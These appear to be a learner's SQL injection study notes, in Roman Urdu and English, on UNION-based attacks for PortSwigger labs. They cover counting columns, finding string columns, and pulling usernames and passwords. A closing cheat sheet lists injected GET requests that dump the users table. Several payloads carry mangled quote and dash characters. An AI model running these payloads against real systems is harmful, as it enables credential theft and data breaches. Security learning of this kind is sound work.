SQLi Bug Hunting Notes:(UNION BUG DAY01)
1: Determine Number of Rows and columns:

Hum sb sa pahla dakha ga number of rows and columns kitna han original query k
Phir hum un ki datatype check karan ga.
Example :- 2 columns han original query k aik ki datatype number ha 2nd ki string ya text .
Select id, name from  TABLE_NAME;

Ab hum union use kar sakta han with some rules:
- Hum 2 columns ka data get kar skta han database sa
- Aur hum ko datatype ka khas khyal rakhna para ga 

For Example:
SELECT ID, NAME FROM STUDENT UNION SELECT ID, NAME FROM ADMIN;
        



Condition needs to be successful for UNION attack to work ;

Only 2 things need to do first:
Count Number of Columns
Check the datatype of columns 
You can place the positions according to datatypes
Let’s go for the goal number 1 👍
Count Number of columns for actual query 🙂
Ab es k bhi 2 tareeks hota han kn kn sa ? 

Order by Technique
- ORDER BY mein column number barhate jao
- Jis number par error aaye → us se pehle wali count = total columns
Example:
- ' ORDER BY 1–
- ' ORDER BY 2–
- ' ORDER BY 3–

—-------------------------------------------------------------------
ORDER BY 1 → OK
ORDER BY 2 → OK
ORDER BY 3 →  Error
Matlab total columns = 2

UNION SELECT NULL technique:
- UNION SELECT mein NULL add karte jao
-Jab error khatam ho jaye → NULLs ki ginti = columns
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL–
—-------------------------------------------------------------------------
1 NULL →  Error
2 NULL →  Error
3 NULL → No error / different response


 Total columns = 3
Important Thing to remember:
We can manipulate the position of columns in UNION selection according to requirements to match the Datatype conditions.

Lab for this page is 
https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
Solution : 
‘ UNION SELECT NULL, NULL, NULL –
Use Burp Suite in the gifts section add this command in header along with the words Gifts 
Lab Done 👍.

Database-specific syntax : 
Har database SQL thora alag likhne ko kehta hai
Is liye UNION injection ka payload DB ke hisaab se change hota hai
Oracle case
Oracle mein har SELECT ke sath FROM likhna zaroori hai
Is liye hum DUAL table use karte hain
' UNION SELECT NULL FROM DUAL--
Agar 3 columns hon: ' UNION SELECT NULL, NULL, NULL FROM DUAL–

*** Finding columns with a useful data type:***
GOAL:
Tum database se useful data (username, password, email) nikalna chahte ho
Yeh data string (text) hota hai.
Original query ki kaunsi column STRING data accept karti hai.

 Situation assume karte hain:
Tum ne pehle step mein yeh pata kar liya 
Original query = 4 columns.
SELECT c1, c2, c3, c4 FROM products;
Ab testing ka idea:
Har column mein 'a' (string) daal kar test karo
Baqi columns mein NULL rakho


Jis column mein string safe ho → no error + output dikhega


Step-by-step testing:
- ' UNION SELECT 'a', NULL, NULL, NULL–
—----------------------------------------------------
Agar error aaye:
varchar ko int mein convert nahi kar sakta
 Column 1 number type hai
—----------------------------------------------------------------------

Test 2:
' UNION SELECT NULL, 'a', NULL, NULL–
—------------------------------------------------
Agar page load ho jaye
Response mein "a" show ho jaye
Column 2 STRING type hai (useful).
—-------------------------------------------------------------------------
Test 3: 
' UNION SELECT NULL, NULL, 'a', NULL–
Error aaye
 Column 3 string nahi hai.
—-----------------------------------------------------------------------
Test 4:
' UNION SELECT NULL, NULL, NULL, 'a'--
No error:
Column 4 bhi STRING type hai.
Column 1 → number
Column 2 → string  
Column 3 → number
Column 4 → string  
Ab REAL data kaise niklega?
' UNION SELECT NULL, username, NULL, password FROM users--
—------------------------------------------------------------------->
USING SQL Injection UNION Attack to retrieve Interesting Information:
Final goal:
UNION SQL injection ka real purpose yeh hota hai:
Database ki interesting info nikalna===> jaisa k username, password, email etc.
Tum yahan tak kya already kar chukay ho?
Kitni columns return ho rahi hain
Kaunsi columns string (text) accept karti hain
SURE Thing is UNION ain’t gonna fail now : )
………………………………………………………………………………………………………..
Given situation:
Assume:
Original query → 2 columns
Dono columns → string type
Injection → WHERE clause ke andar hai
Database mein table hai:
 users
users table ke columns hain:
 username, password.
Yeh sab pata hona bohot zaroori hai.

UNION yahan kya karta hai?
Socho:
Original query ek table ka data show kar rahi hai
UNION bolta hai:
“Iske sath mera data bhi add kar do”
Agar columns match kar jayein:
 ➡️ Database happily extra rows add kar deta hai
 ➡️ App ko lagta hai yeh normal data hai
 ➡️ Tumhein secrets mil jatay hain 😄

' UNION SELECT username, password FROM users--
Original result ke sath
users table ke username + password
bhi response mein aa jayein
Agar page pe table, list, ya text render hota hai: 
Tumhein usernames & passwords dikh jayenge.
❓ Yeh tabhi kyun kaam karta hai?
Conditions:
Columns = same (2)
Datatypes = compatible (string, string)
Injection string ke andar hai
Baqi query comment ho chuki hai (--).
—--------------------------------------------------------------------->>>

Retrieving Multiple values in a single column:
Problem:
Kabhi kabhi : 
Original query sirf 1 column return karti hai.
Lekin tumhein multiple values chahiye hoti hain
(jaise username + password).
UNION normally 1 column mein 1 value allow karta hai
To solution: values ko jor (concatenate) do
Core idea:
Agar ek hi column mil rahi hai:
Do ya zyada values ko string bana kar jor do
Phir ek separator daal do taake baad mein samajh aa jaye.
Assume situation:
Original query → 1 column.
Woh column → string type
Table → users
Columns → username, password.
Oracle example ➖
' UNION SELECT username || '~' || password FROM users--
Username
|| → Oracle ka string join operator
'~' → separator
password


Sab kuch ek string ban gaya.
Result kaisa dikhega?
Administrator~s3cure  : )
—---------------------------------------------------------->>>


CHEAT SHEET FOR LABS:


GET /filter?category=Gifts 
Step 1 : 
FInd the number of columns 🙂
GET /filter?category=Gifts ‘ UNION SELECT NULL –
GET /filter?category=Gifts ‘ UNION SELECT NULL , NULL –
GET /filter?category=Gifts ‘ UNION SELECT NULL, NULL, NULL –
TRY UNTIL YOU GOT 200 OK RESPONSE : )
STEP 2 : 
CHECK THE DATATYPE OF THE COLUMN,
GET /filter?category=Gifts ‘ UNION SELECT ‘A’, NULL, NULL –
GET /filter?category=Gifts ‘ UNION SELECT NULL, ‘A’, NULL –
GET /filter?category=Gifts ‘ UNION SELECT NULL, NULL, ‘A’ –
YOU WILL GET THE IDEA OF THE DATATYPES AFTER THIS : )
STEP 3 : 
GET REAL DATA BY FINDING THE NUMBER OF COLUMNS AND DATATYPES.
GET /filter?category=Gifts ‘ UNION SELECT USERNAME, PASSWORD FROM USERS –
STEP 4 : 
GET USERNAME AND PASSWORD IN A SINGLE COLUMN 😣
WE CAN GET IN ONE COLUMN IF THE OUTPUT COMES WITH ONE COLUMN
SOL:
GET /filter?category=Gifts ‘ UNION SELECT USERNAME || ‘~’ || PASSWORD FROM USERS–
YOU WILL GET THE USERNAME AND PASSWORD IN SINGLE COLUMN AND BOOM 😀.




